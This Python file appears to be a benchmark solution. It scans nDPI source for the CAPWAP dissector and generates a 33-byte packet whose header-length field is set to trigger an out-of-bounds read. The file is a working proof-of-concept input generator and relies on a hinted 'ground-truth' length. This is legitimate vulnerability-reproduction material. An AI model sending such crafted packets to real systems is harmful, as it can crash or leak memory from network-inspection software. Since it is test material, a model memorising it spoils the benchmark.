import os
import re
import tarfile
import tempfile
from typing import Optional, Tuple


class Solution:
    def _extract_src(self, src_path: str) -> str:
        if os.path.isdir(src_path):
            return src_path
        td = tempfile.mkdtemp(prefix="src_")
        with tarfile.open(src_path, "r:*") as tf:
            def is_within_directory(directory: str, target: str) -> bool:
                abs_directory = os.path.abspath(directory)
                abs_target = os.path.abspath(target)
                return os.path.commonprefix([abs_directory, abs_target]) == abs_directory

            for member in tf.getmembers():
                member_path = os.path.join(td, member.name)
                if not is_within_directory(td, member_path):
                    continue
                tf.extract(member, td)
        return td

    def _read_text(self, path: str) -> Optional[str]:
        try:
            with open(path, "rb") as f:
                data = f.read()
            try:
                return data.decode("utf-8", errors="ignore")
            except Exception:
                return None
        except Exception:
            return None

    def _extract_function_body(self, text: str, func_name: str) -> Optional[str]:
        idx = text.find(func_name)
        if idx < 0:
            return None
        start = text.find("{", idx)
        if start < 0:
            return None
        i = start
        depth = 0
        in_str = False
        str_ch = ""
        in_sl_comment = False
        in_ml_comment = False
        while i < len(text):
            ch = text[i]
            nxt = text[i + 1] if i + 1 < len(text) else ""

            if in_sl_comment:
                if ch == "\n":
                    in_sl_comment = False
                i += 1
                continue

            if in_ml_comment:
                if ch == "*" and nxt == "/":
                    in_ml_comment = False
                    i += 2
                else:
                    i += 1
                continue

            if not in_str:
                if ch == "/" and nxt == "/":
                    in_sl_comment = True
                    i += 2
                    continue
                if ch == "/" and nxt == "*":
                    in_ml_comment = True
                    i += 2
                    continue

            if in_str:
                if ch == "\\":
                    i += 2
                    continue
                if ch == str_ch:
                    in_str = False
                i += 1
                continue

            if ch == '"' or ch == "'":
                in_str = True
                str_ch = ch
                i += 1
                continue

            if ch == "{":
                depth += 1
            elif ch == "}":
                depth -= 1
                if depth == 0:
                    return text[start : i + 1]
            i += 1
        return None

    def _find_capwap_function_text(self, root: str) -> Optional[str]:
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if not (fn.endswith(".c") or fn.endswith(".cc") or fn.endswith(".cpp") or fn.endswith(".h") or fn.endswith(".hpp")):
                    continue
                path = os.path.join(dirpath, fn)
                txt = self._read_text(path)
                if not txt:
                    continue
                if "ndpi_search_setup_capwap" not in txt:
                    continue
                body = self._extract_function_body(txt, "ndpi_search_setup_capwap")
                if body:
                    return body
        return None

    def _parse_int(self, s: str) -> int:
        s = s.strip()
        if s.lower().startswith("0x"):
            return int(s, 16)
        return int(s, 10)

    def _apply_constraints(self, func_text: str, b: bytearray) -> None:
        # Apply simple constraints of form (payload[i] & MASK) == VALUE and payload[i] == VALUE
        mask_eq_re = re.compile(
            r"\(\s*(?:packet->payload|payload)\s*\[\s*(\d+)\s*\]\s*&\s*(0x[0-9a-fA-F]+|\d+)\s*\)\s*==\s*(0x[0-9a-fA-F]+|\d+)",
            re.MULTILINE,
        )
        for m in mask_eq_re.finditer(func_text):
            i = int(m.group(1))
            if 0 <= i < len(b):
                mask = self._parse_int(m.group(2)) & 0xFF
                val = self._parse_int(m.group(3)) & 0xFF
                b[i] = (b[i] & (~mask & 0xFF)) | (val & mask)

        eq_re = re.compile(
            r"(?:packet->payload|payload)\s*\[\s*(\d+)\s*\]\s*==\s*(0x[0-9a-fA-F]+|\d+)",
            re.MULTILINE,
        )
        for m in eq_re.finditer(func_text):
            i = int(m.group(1))
            if 0 <= i < len(b):
                val = self._parse_int(m.group(2)) & 0xFF
                b[i] = val

    def _determine_hlen_location(self, func_text: Optional[str]) -> Tuple[int, str]:
        # Return (byte_index, mode) where mode in {"high5_shift3", "low5", "unknown"}
        # Default to byte 1 high bits.
        if not func_text:
            return (1, "high5_shift3")

        # Prefer explicit payload[1] usages
        if re.search(r"payload\s*\[\s*1\s*\]\s*>>\s*3", func_text) or re.search(r"payload\s*\[\s*1\s*\]\s*&\s*0xF8", func_text, re.IGNORECASE):
            return (1, "high5_shift3")
        if re.search(r"payload\s*\[\s*1\s*\]\s*&\s*0x1F", func_text, re.IGNORECASE):
            return (1, "low5")

        # Some implementations may use packet->payload[1]
        if re.search(r"packet->payload\s*\[\s*1\s*\]\s*>>\s*3", func_text) or re.search(r"packet->payload\s*\[\s*1\s*\]\s*&\s*0xF8", func_text, re.IGNORECASE):
            return (1, "high5_shift3")
        if re.search(r"packet->payload\s*\[\s*1\s*\]\s*&\s*0x1F", func_text, re.IGNORECASE):
            return (1, "low5")

        # Fallback to payload[0]
        if re.search(r"payload\s*\[\s*0\s*\]\s*>>\s*3", func_text) or re.search(r"payload\s*\[\s*0\s*\]\s*&\s*0xF8", func_text, re.IGNORECASE):
            return (0, "high5_shift3")
        if re.search(r"payload\s*\[\s*0\s*\]\s*&\s*0x1F", func_text, re.IGNORECASE):
            return (0, "low5")

        return (1, "high5_shift3")

    def solve(self, src_path: str) -> bytes:
        root = self._extract_src(src_path)
        func_text = self._find_capwap_function_text(root)

        # Aim for total length 33 (ground-truth). Trigger likely OOB read of 2 bytes at offset header_len=32.
        # Set CAPWAP HLEN field to indicate 32-byte header (HLEN words = 8 if multiplied by 4).
        poc_len = 33
        b = bytearray(b"\x00" * poc_len)

        # Apply any simple constraints found in source to help pass parser checks.
        if func_text:
            self._apply_constraints(func_text, b)

        # Decide where/how HLEN is extracted; set HLEN words = 8 -> header_len_bytes = 32.
        hlen_byte, mode = self._determine_hlen_location(func_text)
        hlen_words = 8  # 8 * 4 = 32 bytes

        if 0 <= hlen_byte < len(b):
            if mode == "high5_shift3":
                b[hlen_byte] = (b[hlen_byte] & 0x07) | ((hlen_words & 0x1F) << 3)
            elif mode == "low5":
                b[hlen_byte] = (b[hlen_byte] & 0xE0) | (hlen_words & 0x1F)
            else:
                b[hlen_byte] = (b[hlen_byte] & 0x07) | ((hlen_words & 0x1F) << 3)

        # Keep version bits at 0 if typical CAPWAP check expects version==0.
        b[0] &= 0x3F

        return bytes(b)